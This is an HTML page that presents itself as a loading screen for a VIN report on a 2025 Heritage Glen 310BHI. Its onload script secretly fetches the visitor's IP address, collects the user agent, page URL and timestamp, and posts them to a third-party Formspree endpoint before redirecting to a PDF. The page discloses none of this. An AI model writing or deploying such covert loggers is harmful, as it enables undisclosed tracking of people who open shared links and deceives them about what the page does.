<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2025 Heritage Glen 310BHI VIN Report</title>
    <script>
        function logIPAndRedirect() {
            fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                let ip = data.ip;
                let userAgent = navigator.userAgent;
                let pageUrl = window.location.href;
                let logData = {
                    "IP Address": ip,
                    "User Agent": userAgent,
                    "Page URL": pageUrl,
                    "Timestamp": new Date().toISOString()
                };
                
                fetch('https://formspree.io/f/mdkabale', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(logData)
                }).then(() => {
                    // Redirect to the actual PDF
                    window.location.href = '2025_Heritage_Glen_310BHI.pdf';
                });
            });
        }
    </script>
</head>
<body onload="logIPAndRedirect()">
    <h2>Loading VIN Report...</h2>
    <p>Please wait while the document loads.</p>
</body>
</html>
